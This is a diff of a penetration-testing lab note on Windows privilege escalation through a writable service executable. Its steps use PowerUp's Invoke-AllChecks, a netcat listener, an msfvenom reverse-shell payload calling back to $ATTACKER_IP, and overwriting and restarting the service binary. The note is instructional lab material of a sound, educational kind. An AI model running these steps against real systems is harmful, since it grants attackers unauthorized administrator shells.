@@ -1,11 +1,14 @@
-# <span style="color:lightblue">Executable Files</span>
+# <span style="color:#FF5555">Executable Files</span>
 
-## <span style="color:lightgreen">Methodology</span>
+> [!info] Variables used below
+> - `$ATTACKER_IP` – your attacking machine's IP
+
+## <span style="color:#8BE9FD">Methodology</span>
 Microsoft Windows services, formerly known as NT services, enable you to create long-running executable applications that run in their own Windows sessions. These services can be automatically started when the computer boots, can be paused and restarted, and do not show any user interface.
 
 Hence if we get Full Contol permission over the file path location, we can drop our malicious executable file to gain administrator access.
 
-## <span style="color:lightgreen">Detection</span>
+## <span style="color:#8BE9FD">Detection</span>
 
 1. Run Powerup.ps1 and Run `Invoke-AllChecks` (check the service executable field)
 ```console
@@ -18,9 +21,9 @@ PS C:\Temp> Invoke-AllChecks
 
 We can see that we have Modifiable File access to `"c:\Program Files\File Permissions Service\filepermservice.exe"`. To gain administrator access, we can drop our malicious executable file on this location.
 
-## <span style="color:lightgreen">Exploitation</span>
+## <span style="color:#8BE9FD">Exploitation</span>
 
-### Kali VM
+### <span style="color:#50FA7B">Kali VM</span>
 
 1. Start a netcat listener
 ```console
@@ -29,19 +32,19 @@ $ sudo nc -nvlp 53
 
 2. Open an additional command prompt and type: 
 ```console
-$ msfvenom -p windows/x64/shell_reverse_tcp LHOST=[tun0 IP] LPORT=53 -f exe -o x.exe
+$ msfvenom -p windows/x64/shell_reverse_tcp LHOST=$ATTACKER_IP LPORT=53 -f exe -o x.exe
 ```
 
 3. Copy the generated file `x.exe`, to the Windows VM and replace it over  `filepermsvc.exe`.
 
-### Windows VM
+### <span style="color:#50FA7B">Windows VM</span>
 
 1. In command prompt type: 
 ```console
 C:\Temp> sc start filepermsvc
 ```
 
-### Kali VM
+### <span style="color:#50FA7B">Kali VM</span>
 
 1. Wait for a reverse shell on your kali machine.
 
